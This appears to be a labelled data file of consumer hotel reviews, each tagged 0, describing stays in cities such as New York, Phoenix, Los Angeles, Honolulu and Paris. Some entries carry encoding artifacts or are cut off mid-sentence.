"great little jewel a great little place, in a great locationé¥?.hotel is located in a lovely part of chelsea, when you stay at the lodge you can walk to pretty much everywhere (well not exactly but you get my drift). the street is nice and leafy, safe at day and night, some great bars, delis and restaurants around, within walking distance. i def recommend the thai place on the corner of 20th (where the lodge is) and 8th ave (on the left hand side). even if you have to wait for a table, it's worth it!yes the rooms are small, and you're stuffed if you're on the 3rd floor like us carrying suitcases all the way up. but really, does it matter? we wanted a clean place in a nice location, a good shower and a nights sleep....it's nyc after all, so many better things to do than stay in your room....i was a bit apprehensive about the whole shared toilets issue, being a neat freak that i am, however the toilets were very clean. i tell you, cleaner than what i've seen at some people's houses. even though really small, the rooms were very clean. we are both over 6ft and sometimes it was hilarious how tiny the room was for us (and the bed was a bit short too)é¥î?¨ut what this place doesné¥?? have in size, it has in its charm and fantastic location.some have complained about the noise, we had no problems. yes, there is a school across the street and kids can be somewhat noisy in the morning; however that did not trouble us. same with traffic... i mean it's new york, if you wanted a tranquil place to rest up, go to maldives.yes the guy at the front desk during the day could have been a bit nicer, but he answered our questions and helped with our suitcasesé¥?.overall, chelsea lodge is a great little place and i will wholeheartedly recommend it to all my friends. it just depends what you are after. if you want a large room, king size bed and room service, this is not the place for you. but remember you will also pay a lot more that what youé¥??e paying here. if you want a cute little place, small but clean room in a fantastic location as your base for exploring manhattan, go for ité¥?.oh and did i say it was not that expensive either...",0

"not all it's cracked up to be so, i decided for my birthday, i wanted to go away (but not out of town) for a weekend. i picked the pointe hilton squaw peak because it claimed to have some really good deals for a pretty decent price. well, let me tell you - going to a resort in the off season, is not all it's cracked up to be! when we checked in, the staff were not friendly, no one offered any help with baggage, and they did not give us the coupon book we were supposed to get or our $50 dinner coupons. our room was okay, but the shower/tub did not drain. our neighbors were packed about 20 to a room and there were constantly huge bags of garbage sitting out in front of their door. none of the elevators worked (we were on the 3rd floor) and none of the ice machines worked. the pool areas were nice enough - of course, when we got there, we couldn't get tubes for the lazy river because the pump to blow them up was broken. it just seemed like everything was broken or out of order. when we asked the person at the front desk about the coupons we never got and the dinner vouchers, he was completely unhelpful and pretty much told us, sorry 'bout it - it was your responsibility. no, actually is wasn't my responsibility, i don't work there!! so, if you're planning on staying here, you might want to reconsider - the staff are not very friendly, and definitely do not feel they should go out of their way to accomodate you. i can say that both nights we ate at the lantana grille lounge and the food was very good and our server was an absolute joy! but we probably will not stay here again - or advise anyone else to stay here.",0

"lots of kinks we stayed at this hotel the night of the 31st. when we checked in, we walked into a room that looked like someone was still there- bed unmade, etc. the receptionist comped us and gave us a free upgrade, which we appreciated- the 2nd room we had to put in a request for the fire alarm to be fixed since it continually beeped. -we had cocktails at the lounge 1x that night. when we checked out, there was a bill for two visits to the bar. we felt like we had to defend ourselves. the staff checked through all receipts and finally found it w/ a very different signature / printed name than mine (thank goodness we had a the bar receipt when we actually ordered drinks so signatures could be compared). it had our room number on it w/ a totally bogus signature. no apology from front desk, nothing. we received a credit............this hotel has a lot of kinks to work out- would never return again!!!! too bad......",0

"good but needs a makeover this is a nice hotel in a great location that is close to downtown and chinatown. the service was good at check-in and the staff was very helpful. the room was obviously nice at some point but needed a major update, one of the staff told me that the hotel is going to be remodeled in the next year. the maid service was ok but seemed inconsistent in that they only turned my bed down once the week that i was there (even though i was out and the do not disturb sign was not up). overall, this hotel is pretty good but should be great after a remodel.",0
"perfect- could not rate more highly this hotel is fabulous. the location is unbeatable and the price is the best part! short walk (2 minutes) to downtown hollywood, chinese theatre and the boardwalk, 2 minute walk to train station and one train stop from universal studios. great underground parking if you have transport (although at this place you would not need it as everthing in hollywood is at your doorstep). friendly hotel staff, eager to help with any request. lovely big clean pool and deck chairs to relax on. rooms are huge, big beds and large kitchens means you can cook anything. very clean rooms which are serviced prefectly every morning.could not rate this hotel more highly, would definately be back and would reccommend this hotel to anyone i know.",0
"nice hotel my family and i stayed at the tuscan inn for three nights. the hotel was a wonderful place to stay and we were very comforatble. the lobby was welcoming, the staff was friendly and we felt good about being there. i would say, though, that the price was just a bit too high for what we got. $175 per night (after the discount for firefighters, mind you). there is virtually no counterspace in the bathroom at all. upon our arrival, there was a slight odor in bathroom but nothing worth complaining about. maid service was prompt and outstanding. but, it was close to the wharf and soooo convenient. so, maybe the price was warranted. beware though....parking is $45 + tax. i called before we ever arrived to inquire about it and was told that parking was no problem at all. then the clerk told me the price. woah!!! when we arrive at the valet stop, the valet told me that if we have aaa, the price would be $25. cool. when we went to check out, the front desk clerk said that we could not have the discount because we did not make a reservation to park. what??? i guess calling to inquire about parking while giving them our name and reservation dates didn't warrant the clerk to inform us that we should make a reservation for our car also. trader joe's is right around the corner and so is a safeway. made it nice for a morning breakfast with the kids. i would definately stay there again. but, next time, i will leave my car at home!",0

the royal palms is gold! royal palms is a wonderful boutique hotel in a beautiful location with views of camelback mountain. the rooms are luxurious and the bed is like sleeping on a cloud! wonderful restaurant - the food is delicious. the grounds and pool are stunning. it's an oasis within a city - you feel like you're in a spanish colonial estate.,0
"great pool, friendly staff we wanted a reasonable price and a hotel that would shuttle us to the airport early in the morning. the staff here was friendly and mroe than willing to help us with directions. we wanted to turn in our rental car the night before we flew home and this hotel provided us shuttle to the airport (only took about 10 minutes) at 5:30 am. there are 2 computers for guests and they did not charge us to print our boarding passes (some hotels charge per page). the pool was a good size. we spent 3 hours there! i liked the stand up shower (no tub). not sure if the beds were uncomfortable or if it was me, i just kept tossing and turning (could be because i knew we had to get up so early). breakfast is provided from 5-10 am so we were still able to eat before we left for the airport. great bargain!",0
"god attending universal park this is a god hotel with excellent service. except they charged me the wrong amount, something i realised when i had gotten home. after a call and luckely for me the reseptionist rememberd me. this hotel maybe has the best breakfeast you could have. free ride to universal from the hotell.",0

"hovel hellhole!!! don't do it!!!!!!!!!no no no no nooooooo!!! stayed at this excuse for a hotel a few months ago and would never ever venture there again. i was visiting the city with another female friend and both of us have a sense of adventure but this was extreme!!! we shared a7 bedded dorm which we appreciated would in no way be private, but i didné?t expect the utter filthiness of the place. i passed down the small dirty staircase passing the bathroom (this term is used in the most loosest sense!!) to our room. the room was strewn with dogends and spliff butts, and stank to high heaven. that night it rained and i kid you not, the room was waterlogged!! i had to wade through the water to go to bed! i told the staff but they really didné?t give a toss or make any effort to mop it up(though, in fairness, there was so much water a mop wouldé?ve been useless.). so, i get to my bed and theres a body in there, in my sleeping bag!!! poor fella assumed this was his be because all the others had bodies already occupying them or were bare, no sheets at all. i felt awful but piked him out anyway. i stayed here for2 nights, never washed or showered and slept in my clothes for fear of contamination. the communal basement dorms here should be shut down!!!!!!!!! it truely is a disgrace, and no matter how small your budget, doné?t stay here. save more money or doné?t bothere going at all until a later",0

"Great location and service My wife and I stayed at Casa Alta Vista for 2 nights in December. Overall, the room was worth the price. The room we had was small but had enough room for two people (assuming you aren't spending much time in the room). The bathroom was sufficient and for the most part clean. We actually had a spectacular view of the mountains from a small window in our shower (Rm #12). The service was excellent and we found that the staff went out of their way to accomo",0
"great hotel, poor staff checked in on the 30th for 3 nights. we really excited about celebrating the nye here as we had received information from the hotel the party would be massive. anyway, upon check in we had to change room as the twin room was tiny - small enough you could not swing a cat and there was mould in the bathroom. they showed us another room which again was very small and again complained. we later received an upgraded room which was an extra $75.00 a night, and considering the bigger room etc we did not mind paying this. we then thought as we had not booked direct with the hotel and had paid vast cheaper rates that are why they tried to fob us off with a small, dingy dark room. anyway, the staff was very relaxed and like most state on here are only there to help the real celebrities. however, the bar staff at the tropicana bar were lovely and this is where we spent most of our time. drinks are a little over priced, but you are in the middle of hollywood and the view from our room could not be better. as we opened the curtains what do we look at - nothing but the hollywood sign. i had also been advised that the tickets for the nye party were going to be $50.00 we nearly got charged $100 but got that down to $75.00 and since i have sent them the email confirming we would be charged $50.00 and since had the refund. check your bill throughly upon departure.due to the downs there were all the ups too and we did spot a celebrity or 2 here, but don't expect to get near to teddy's - a listers only and you would be lucky even to find the entrance. one last thing, it is true that there are the ghosts of the roosevelt hotel, try standing in the blossom room in the dark on your own - you will soon realise it is true!!!!!!!!!",0

"just got back...wished for a few more beautiful days! just returned home tonight from a six night trip to the grand paradise bavara. i went with my sister and my best friend from college. for a trio of girls in their twenties we had a wonderful time. there is so much to do and see that i wised we had a few more days. the people of the dominican republic could not be any nicer. both at the hotel, with our excursions, and around the area. our room was a little musty at first but with the air turned on and my sister bought a candle, we soon felt right at home. the queen beds were a little small and so i asked for a roll a way bed just in case we needed it and they had it in the room within the hour at no extra charge. the housekeeping surface was top rate...i had brought some soap and shower gifts that we gave to the housekeeper the first day and then on the final day..i left a collection of school supplies and wrote her a note to give to her children or children who could use them. she was always great at making sure we had as much bottled water as we asked for and whatever kind of bottled caffinated drinks we requested. we took the opportunity to take domingo up on his offer and paid $35.00 (u.s) to go horseback riding. you can do a free hour ride in the morning or the two hour ride in the afternoon you pay for but you also get to explore a beautiful cave and take a small hike. we did this and one thing domingo the guide should have told us was to wear tennis shoes and not riding boots...riding boots are fine for horseback riding but not for the hiking over rocks. if you like riding fast...at about a canter on the beach the two hour ride is a must!! the other ecursion we did was one that came with our travel package..the trip to soanoma. this was a long day..and we had not realized it was going to be so long. we took two buses to get to the town that we then boarded a speed boat to the island. we ate lunch provided for us on the island and sun bathed. we then were taken from a speed boat to a catermoran boat. on the boat there was dancing and drinking...oh and lots of rain (which was freezing)...the rain was the only part that was not fun..the rest was a good time but cold after being rained on. we did not realize that rainy season had started and so we were not completely prepared for the rain. the locals said that the rainy season started earlier this year and that the last couple of years had been harder to predict. the rest of the week we stayed around the hotel laying out by the pool, playing pool games, water areobics, and talking with all kinds of people from differnet countries. we explored the diso one night with some guys from italy. they spoke a little french and my sister understands french and so it was fun to try and communicate. with the more we drank and danced the less of an effort we had to make and it all turned into a fun time. the only downside in our opinion was the food. we were not completely impressed but also we did not go there to eat..we went to get sun and relax. the safe food for us was the chicken at the grill. i enjoyed the asian food the most of any speciality restaurant. i was dissapointed that each night the desserts were about the same, i was hoping for a little more variety...but it also saved me some calories because i didn't always eat the dessert. also the other aspect that was different for me was the shopping and hard selling. my sister and i went to plaza bavara to shop and we were not prepared for a few domincans to be outside every store begging you to come in and look around and when you go in the store they follow you around. also bargening was not something we were use to but my sister did very well with her purchases. we found that if you don't give any eye contact that they don't approach you as aggressively, but again that is not something we were use to so it was hard to change in just a week. the other aspect of confusion for several travelors was how much you had to pay to come and leave the country. it is never really discussed so i will let you all know this is how it is as of the",0

"we'd go back i was a little worried after reading some reviews, but we were pleasantly surprised. pools - we went to the water park on thursday afternoon and friday morning, thursday was fine but friday was a little too crowded with kids. we moved to the north pool and had it almost to ourselves until a mob of 20 bratty kids came in. even with the bratty kids we still enjoyed ourselves, you can bring your own floats in the pools(and lazy river) along with drinks to the pools outside of the water park. holel - we stayed in one of the half-suites for $89/night and it was more than adequate. it had a king-sized bed(extremely comfortable), a shower tub with the vanity outside of the bathroom and a fridge in the closet. there was a stinky smell coming from the sink but that was a minor issue. nice flat screen on the wall. i do agree with other posters that you can really hear your neighbors, but that didn't bother us too bad.restaurants - after reading the reviews on here we skipped the restaurants. we walked in the hole in the wall for breakfast on friday morning and left after noone acknowledged us after 10 minutes. we were impressed with the pina coladas at the hotel bar; beer and drinks prices were average for a resort. we ate at gallaghers sports bar (right off the property) twice and it was average bar food, nothing spectacular. i do highly recommend barrios cafe, a mexican restaurant on 16th that was fantastic - the area is a little shady, but the chicken enchiladas were worth it. staff- concierge was very nice and helpful. we tried calling the front desk several times from our room at different times and couldn't get through. when checking in the girl knew nothing, didn't explain where our room was. there are guys on golfcarts roaming the property that will help you, but they expect a hefty tip in exchange.overall, there was definitely more good than bad - i'd recommend this hotel with families looking for a nice getaway. there are also some cute feral kitties that visited us each morning, if you see them toss them out some treats.",0
first time ill go back just got back jan 29th to feb 5th the resort was very clean. the beach was alittle crowded but was raked every day and looked better then the palace. the people were very friendly!! the only people i had any problem with were the cheap people who wouildnt give the help a dollar because they were at an all inclusive. the bar tenders and maids make approx 4000 pesos a month which is about 160.00 us i gave the one guy two stuffed animals and a bag of suckers for his 4 children and he had tears in his eyes. the rooms were,0
"casitas are comfortable stayed in a bi-level casita for a week. it was very comfortable, the bed was good. the layout was good, and it was quiet and felt pretty private. the property is very large. they have a good workout room which does get crowded. the location is phoenix is convenient. my complaint about the room was the decor, it wasn't good. also, there was very little lighting in the bathroom, i had to keep the window open and have the heat lamp on to see in the shower. i was happy to have a full size fridge and private carport. i'd be willing to stay here again, but there are a lot of fancier options in phoenix/scottsdale for the same price or a little more - i'd rather pay a little more for something awesome. i was travelling for business, and didn't get a chance to try out the lazy river and the pools but they looked nice. this would be a good place to bring the family. room service was good too.",0

"excellent hotel i write reviews because i use reviews to select the hotels i stay in. this is the first hotel where i give it an almost perfect rating; especially for the money. it's 5 star all the way on both service and comfort. there aren't many restaurants around the hotel (it's in a business district), so the food's a little pricey, but it's delicious and the service was great. in fact, the only suggestion i can give this hotel is to upgrade the toilet paper!",0

"Met our requirements and good value We had an overnight stay at the Aqua Palms before an early morning flight the next day. I appreciate that reviewing a hotel on the basis of a somewhat rushed overnight stay may not do justice to it, as there is no time to use the range of facilities, and little time to interact with staff.However, we were satisfied with the hotel, particularly as we got a great internet rate. Location was fine for us as we were without a car - walking to the beach, the Ala Moana Shopping Centre, local restaurants was easy. Also being at the western end of Waikiki made it a quicker journey each way to the airport.We were glad to use the baggage storage while our room was being made ready and found the service was good. Our internet special offered a free upgrade and chocolates - the chocolates we got only after reminding them, and the 'upgrade' they appeared to have forgotten about, as what we were eventually offered after reminding the staff was not really an upgrade at all.The room size was fine for two people, we had a room facing the street with an 'around the corner' small view of the sea. It was clean and comfortable, with internet access. The air conditioning was quite old and noisy. The kitchenette facilities were handy. Some parts of the room (eg ceilings, walls) looked like they were in the process of being re-painted, as there were visible touch up points here and there, ready for the final coat of paint. This gave the room a depressing feel.We did not partake of breakfast as it was scheduled too late for us - and I'd recommend that with the number of early morning departures for Australia now occurring from Honolulu, perhaps the Aqua Palms could accommo",0

Highly recommend! I just returned from Paris and highly recommend this hotel if you are looking for a boutique hotel. It is small and quaint. Very tastefully decorated - a comfortable lobby and tea room. I am extremely particular about hotels and spent countless hours researching a hotel in Paris. I booked the hotel on their website and it was very easy. It is an immediate booking - you don't have to wait back to hear from them like many of the small hotels. I did call the night before to confirm my reservation. There is also a computer in the tea room with free internet access. This was extremely convenient since I do not have a laptop. There is also wifi in the rooms. This location is wonderful. It is not in the tourist section but is easily accessible to St. Germain and is in walking distance to most everything. The Eiffel Tower was probably the furthest walk and took about 30 minutes. We saw all the sights and never had to take the Metro. I really enjoyed coming back to the peacefulness of the hotel after being around the crowds all day. The hotel is very clean and up,0

"Can't wait to go back! Why so many unhappy vacationers? Background: My husband and I are in our late 20's early 30's and travel as much as possible - no kids - from Hampton Roads, Virginia. We stayed at the RIU Yucatan in the Mexican Riveria, so are familiar with the RIU chain.And now for the review... Check-in: We arrived and were immediately greeted pleasantly and given some sort of sweet fruit juice and a RIU Palace souvenier. We recieved the key to room 1096 and went on our way. When we arrived at our room, the view from the balacony was the roof of the theatre - not too pleasant. Our luggage arrived about 2 minutes later and we turned around and went back to the front desk to request another room. We didn't want an ocean/pool room, just a view something other than a concrete roof! The front desk person understood and then proceeded to flip through papers on a clipboard quickly for about 3 minutes and said he didn't have anything avialable until 2 nights later. We said there must be something??? And he continued to flip through the clipboard for another 2-3 minutes and when he could tell we weren't going to give-in, he then gave us keys to room 3005. This room has a view of palm trees and the neighbooring RIU resort, which was fine with us. The front desk sent champagne later that night for the trouble. Tip: Request a room prior to check-in, if possible, and stay away from rooms over the theatre and resteraunt. They are the worst rooms in the entire resort.Room: The room itself was nice - very clean. I smelled a musty odor for about the first hour - then it went away. The beds are very hard, but we were prepared for this after staying at another RIU resort. We tipped the maid $2 a day and got flowers and towel animals. They even put music on for us (using the alarm clock) in the evenings.The water pressure was weak if you took a shower between 6:00 and 7:00 pm when everyone was getting ready for dinner. Our toilet kept running so we had to make sure the handle was in the up position to solve the problem. AC worked great and I had no trouble figuring it out.Tip: Bring slippers or socks. No matter how clean the room looked, I always felt like there was sand, etc. on the bottom of my feet, so I had to wipe off before getting in bed, etc.Grounds: Absolutely beautiful! One of the best parts of the resort. Very clean and well manicured.Pool: Large enough to accomo",0

"Comfortable and convenient My friend and I stayed in Room 655 on the first of ten nights in Europe. We were very tired after several flight delays and arrived at about 8 pm. The two at the check-in desk were very friendly and professional. The young man recommended a real German restaurant down the street and to the right, but when we visited it, we could see the clouds of smoke so we didn't go in. It will be nice when Germany joins the majority of Europe and bans smoking inside. Our room was on the top floor, at the end of the hall, and in a corner. The view from the room was nasty-a fenced in building with standing water all around. The area was being up",0

"nobody home - unable to check in! lax security - beware i called the hotel royal a couple of days before my arrival to let them know i would be arriving around midnight. the phone person told me that i had nothing to worry about, the front desk is staffed 24 hours. upon arrival i found a hotel lobby with two guests, like myself, unable to check in because there was not a single employee on the premises! calling the hotel on my mobile phone got no response.the other couple gave up and decided to go sleep in their car. i didn't have that option, so i sat in the lobby with my luggage for over an hour until a former employee passed by, noticed me, and based on her previous experience figured out how to log on to the hotel computer to check me in. she was kind enough to even show me to my room, despite the fact that she didn't even work there!this hotel could be nice - the rooms are fairly decent - but unfortunately it is very poorly managed, as evidenced by how the lobby can be completely unstaffed and open to the street in the middle of the night. i live in a big us city and i know about new orleans' crime problem, so i was always worried about entering the lonely room-access stairwell of the hotel at night while nobody was watching who came into the place. anybody could easily walk in from the street, unobserved, and be waiting outside the door of your room. this is a small hotel - maybe 20 rooms - so there is not much traffic of guests in the corridors at night. take this into consideration before you book a room here. people who have posted pleasant reviews probably never thought about the extremely lax security at this hotel, and what could happen if they are unlucky.",0

"skip this place we just got back from phoenix where we had stayed at this hotel for four nights. normally we stay at hampton inns but wanted to be in the squaw peak area and thus decided to stay here. right from check-in we should have known what to expect. we arrived too early to check in but since we travel very often we knew it was possible to leave your baggage there until check-in. while initially the staff was rude, the gentleman finally agreed to have us leave our luggage and said it would be in our rooms when we checked back in later. of course it was not in the room and we were on the second floor and no elevator! we are in our 60s and this was not convenient for either my husband or me. breakfast is boring with the same thing every day, not like hampton inns that vary the menu. the air conditioning did not function well, the water in the tub did not drain out so that when taking a shower you were up to your knees in water. when we arrived and i asked where one could go to check on e-mails, as had been advertised in their listing service available in the business center, they told me it was down and not expected to be up until monday.........this was sat. on monday when i checked again i was told still not up until tuesday. one couple standing at the desk when i asked that question and heard this, turned on their heal and left as this was a businessman who needed that service. very inconvenient. still not up when we left on wednesday. maintenance is terrible......lot of evidence that the place has been let go. breakfast area is very small..........as is the pool.......and with a tendency to cater to kids' traveling sports teams, you are lucky to find a spot to sit. this is the second time we have encountered this with a best western and will never stay at one again. hampton inns much better. skip this place.........",0
"shame about the staff echo what the other reviewers say - building and rooms are great - staff and service is shocking. it was my second time staying at the hotel (first time was better) and despite a really good deal on the room, the attitude of the staff took the shine off. my tip would be - pay more and stay at le meridien at beverly hills. note also for first timers to la: while the hotel is in hollywood - you'll find not much else is! west hollywood/beverly hills is where all the shops/restaurants are - a 15 min cab ride away.",0

"parking issues at biltmore millenium service was good, decor interesting for los angeles, friendly stuff, lots of events and weddings taking place downstairs, good restaurant...but someone already noted - parking (a couple of years ago) was over 30 dollars overnight! and for over two hours! including guests you invite over to dinner! i stayed in this hotel and invited some friends who live in town, and they got stuck with 33 dollar bills for parking their car in the hotel. nobody walks in la or uses public transportation, it is only driving. downtown la is not exactly a beautiful area, and not pedestrian friendly either. there is no place to park near by either... so... i think with the money this hotel charges for stay, parking for guests should be complimentary or reduced price, no more than 3 dollars. but 33!..hmm",0

"it's falling apart - time for the hilton group to update this property my husband had to stay in this hotel for 12 nights, owing to a business trip. i joined him for the last 5 nights before we headed off touring. despite having a high level hilton honors priviledge card, he got a very ordinary room, surprisingly small compared to say the average high end motel room, and was told nothing else was available, when he checked in. they gave him a few complimentary vouchers for the cheapest breakfast available on site, instead. when he got to the room, it had yet to be serviced. two days later, he returned to his room mid morning to get some papers he had left inside by accident. the keycard would not work. he ran to reception where it was reissued. it still didn't work. long story, short - 5 maintenance staff members and 45 minutes later, he got access to the room. of course, by now, he was extremely late for a meeting where he had to make a presentation. they gave him a $20 voucher for his inconvenience!!!!! the room was very tired - furniture scuffed and old fashioned, drapes faded, paintwork scratched, bathroom fixtures scoured until the base metal was exposed, that kind of thing. the desk was too small to do any work on and use a pc at the same time, it had an old-fashioned tv with a poor screen. worse, the airconditioning was extremely noisy and the thermostat very insensitive. it turns itself off for long periods, then the fan comes on at maximum warp to cool the room down in a hurry, then runs a little more quietly before shutting off. this cycle is not conducive to a peaceful night's sleep.my first day, arriving jet-lagged from the uk, they had a water problem. i ended up having a cold shower in the morning, but there was no water by 10.00 am. guests were told they could use the facilities in the spa building, 5 minutes walk away. while the water was off, housekeeping 'did' the room. how you can clean a bathroom properly and hygienically without water, nobody ever managed to explain to my satisfaction. further, there was evidence of remedial repair works going on around the accommodation blocks, and the nearest elevator to the room was out of order for the whole of my husband's 12 night stay.this hotel has a large pool and water activity based leisure facility. this is ideal for families with children and people wanting to relax and sunbathe. if you spend most of your time here, you will probably consider the property not bad. if you mostly just use the rooms, you are unlikely to be impressed. the best feature, to me, was a reasonably comfortable bed.while the front of house staff were polite and embarrassed at the shortcomings, and claimed they wanted to help with the problems we encountered, they didn't actually achieve much or offer anything positive or genuinely meaningful to alieviate the situation. the other staff members we encountered - housekeeping and ground staff - seemingly spoke little or no english and just put on a smile because they had been trained to do so. not our usual hilton experience.",0

"huge room, plush bed, excellent stay my husband and i booked the renaissance for the last night of our honeymoon, as our flight from jamaica came in too late to book a connecting flight back to seattle. for $99, our expectations were definitely exceeded, and we would recommend this hotel to anyone!we arrived after 11 p.m., exhausted, and were pleasantly surprised to find out we'd been upgraded to a suite. the suite was huge and shaped like a rectangle. the separate sitting area, desk and old school tv were on one end, but that area was the farther from the window so rather dark. the restroom was in the middle of the suite, along with an empty fridge (no minibar but the sign said they could stock it for you) and a big mirror, good for getting ready while the husband was in the shower the next day. the king size bed was luxurious, and we appreciated the huge flat screen tv in that area of the room. we had a view of the airport and burger king from our 6th floor room. one odd thing, the room had one bathrobe and one bottle of water, as if it was set up for one traveller even though we'd noted there were two of us on the reservation...but no big deal.the only slight drawback was speed of service in the lounge. we went down at 11:20 p.m. for a quick bite as we hadn't eaten since 4 p.m., and it took our food (an average club sandwich) 45 minutes to come. there were maybe eight people in the lounge so i'm not sure what the problem was, but the server apologized.overall, for the incredible value we would definitely stay here again if we have to fly in/out of lax. one nice perk, we are marriott silver elite members and they recognized us with a coupon for a free latte in the morning. this was definitely one of the nicer marriott brand hotels we've stayed in.",0

"great apartment hotel! my husband i stayed at the hotel in december for 5 nights with our two children,(a 3 year old and an infant). we stayed in a 1 bedroom apartment and it was wonderful! at night, we used the roll out sofa in the living room for our toddler. the room was updated and had decent furnishings, some of it modern and some not. it has a kitchen and a seperate bedroom. we have stayed in a regular hotel in nyc before and it was so small and we had no way to properly clean our children's sippy cups and bottles. our kitchen here came equipped with a dishwasher, which was wonderful.ok, the downside is that there is very little service from the staff. no one helped with our bags when we arrived or when we departed. sometimes we would call downstairs with a question, and no one would be at the desk to answer the call. the internet was down 2 out of the 5 days. i called ahead to see if we could arrange using the baby crib from them and they informed me it was $20/day. we thought that was too much so we brought our own.this being said, we would definitely stay here again because the rooms are so large and the location is excellent. you are next to the w hotel and across the street from the waldorf astoria. it is perfect for a family. you just need to go into it not expecting a lot of hotel service. it is not that kind of establishment. it is basically an apartment in a great location at an affordable price.",0

"experienced the good and the bad similar to some other disgruntled reviewers here i was assigned a different room than i had booked. there were three of us and i had booked a two double bed room and had a confirmation to prove it. i had chosen this hotel for that particular reason as i was having difficulty getting a two bed room at nearby wharf hotels. i was given a king room with a cot on check-in. after a few trips by the clerk back to the manager who remained out of site i was told i had not booked a double bed room but a double occupancy room which wasn't true. they said they noticed we had three people so had automatically provided a cot to our room, i was told they were full and there were no other rooms available. when we got to our room the cot was already there but due to the small room i had to re-arrange furniture to get it to fit, in doing so having to re-assemble their cheap particle board table. the room faced a side street, the street directly below became very active at 5 am with motorcycles in particular in addition to trucks noisily heading up the street. i'm a sound sleeper normally and nothing wakes me so this was just a sign of how noisy it was. i managed to get switched to a two double bed room for our next couple of nights and experienced what all the good reviewers must have. the room was significantly larger, still small but liveable, and although still on the 3rd floor it faced the wharf and what i would have thought was the busier street but the traffic was much quieter and i didn't hear much at all the next two mornings. the valet's were a little slow and i hated the vulture baggage guy. i don't have a problem being helped up to the room although i;m fine doing it myself. this guy immediately put all my bags on the cart while i was pre-occupied with the valet but then while i was trying to correct the problems with the room at check-in he was impatiently trying to get us to hurry up in spite of me telling him just to leave the bags. the location is great, i opted for a fisherman's wharf stay for vacation having stayed near union square on business in the past and i'm glad i did as it was easy walking distance to chinatown and the touristy area of the wharf. i'd be leaving a better rating if i were given the 2nd room on arrival but due to the mix-up and the fact others have experienced the same i'd avoid this hotel in the future opting not to take the chance of another mix-up.",0

"stayed there by default as well we stayed at this hotel by default as well. the hotel we were booked for originally was over booked and we were escorted to this hotel. my husband and i found the hotel very centrally located (a close walk to puerta del sol and plaza mayor). the hotel was very clean as well. i wouldn't call it's location the red light district, there is one sex shop located on the corner, but we never saw girls outside and there are no girls dancing in the windows. i admit i was hesitant to stay there at first, but never felt threatened or unsafe walking back there at night. the staff was not the most helpful but i think it was because thier english was not the best. when we were able to communicate in spanish (our spanish is limited) they were at least friendly and tried to accoma",0

"wonderful experience I've just got home from a great vacation. This was my first out of the country vacation, and all I can say, it was a very excellent experience. At first, I was problematic on where I would stay in Honolulu and I was thankful that my friend suggested Aqua Palms And Spa to me. When I arrived in this hotel, I was amazed with the place and I found out it is near at downtown, probbably a short walk to fantastic shopping and restaurant establishments.

"decent services, dreadful smell i was happy with the fact that their wireless was free, they had good cable channels (comedy central), and the room was quite spacious (although i did have a handicapped room so i don't know if they're all that way). i appreciated the refrigerator that functioned as a normal refrigerator, not an overpriced minibar, so i could keep my leftover dinner in there for lunch without worrying about getting stuck with a charge for opening the minibar.in general, the appointments were better than you'd get in a top hotel -- in a top hotel in seattle you'd have a much smaller room, wireless would cost $20/night, and you still wouldn't get comedy central. parking was expensive -- $15/night -- but you can park on the street for free with no problem. i had one major qualm with this motel, and that was that my non-smoking room was by no means truly smoke-free. you can't take a room that has been smoked in for 30 years, spray it with some sort of chemical that's supposed to neutralize the air, plop a no smoking sign down on the dresser, and call it a non-smoking room. after 5 minutes in the room, it was clear that it had been smoked in for years, and within an hour, my throat was raw and my eyes were burning from the residual smoke and chemicals. and i'm not all that sensitive to smoke, having grown up with a parent who was a smoker. the smoking issue is too bad -- because otherwise this motel is a good value for the price.",0

"loved the millennium biltmore! my boyfriend and i stayed at this hotel for 4 days before heading off to las vegas. was a little worried about staying at the hotel after reading some of the negative reviews, however i was pleasantly surprised when i arrived. the hotel is amazing with a very grand feel. on other reviews people have said its old fashioned but i would say its more old style hollywood glamour. it doesn't feel dated at all, gorgeous decor and the first floor reception and lobby are beautiful. i was shocked when we got to our room...it was huge and really lovely. it felt like a suite with a living area etc and a really big wardrobe. the bathroom was quite small but nice and clean. the hotel room had everything we needed, clean comfy beds, lots of info on la, plenty of space and a big tv with lots of channels. i'm not sure if all the rooms at this hotel are the same but our room was massive.we ate at the japanese restaurant on our first night as we was too tired to leave the building. glad we did as it was delicious, really modern, quite pricy but definatly worth the money. every member of staff at this hotel was lovely and helpful. reception were extremely accommodating and couldn't do enough for you. the guy at the concierge was really helpful too. he helped us book loads of great things to do... tours etc and helped us save money whilst doing so..he also recommended good places to eat, and all that we tried were brilliant. we did a great tour of la seeing the hollywood houses, chinese theatre, venice beach, santa monica pier, rodeo drive etc. was fab and we got to see so much of la that on our other days we could then go back to the places we enjoyed the most. venice beach is really nice, and has a cool vibe to the place. i love shopping and found the best shops on melrose avenue, the shops are different and unique there and a lot cheaper than rodeo drive or robertson drive! we didn't hire a car but buses and trains are very cheap!we didn't pay a lot to stay at this hotel at all and it definatly exceeded our expectations. it is a very high standard hotel in a good location where u can feel safe at night too. i will definatly stay at this hotel again, i loved it!!",0

"great value - we will be back! my boyfriend and i stayed for 5 nights just before thanksgiving and were extremely happy with the place.cons:- the room was smaller than expected but that is not a big deal.- there is no separate bathroom (rather, there is a sink and shower area within your room) which is my biggest gripe but for the price we paid, we can't really complain.- shared toilets in the hallway. this wasn't a big deal as they were always clean and spotless. they weren't too far from the rooms either and i probably saw only one other guest in the hallway in my whole stay.- no elevators. we stayed on the 2nd floor so only had to lug our suitcases one level up but could be a problem for those higher up and with more baggage.pros:- great value for money.- not too far from subway stops. - felt very safe and secure. i never felt unsafe in the room or in the immediate area the hotel was in.- walking distance to shops, restaurants and other sights.- free wireless internet in our room was a bonus.- quiet in the rooms, no real issues with noise.the pros far outweighed the cons (which are more preferences that i could live without) and i will definitely be back the next time i am in new york.",0

"very nice hotel we stayed at this hotel while attending a convention at the l.a. conention center. service is wonderful - we asked for a few things and got them almost immediately. there will always be an attendant to open the door for you. it is not the best location for the lacc as it is a mile and a half away. fortunately we had shuttle service. there is also not much shopping or restaurants nearby as it is in the business district. but you can walk several blocks and get to what you need. the rooms are nice and comfortable however i agree about the entry way being awkward. the main door and bathroom door just inside almost bump together. the closet is roomy, but has no light. if you put your suitcase in there on the rack, you'll have a hard time seeing your belongings. tv does need to be upgraded. there were only about 10 channels available. but, those are minor things to me. i would stay here again.",0

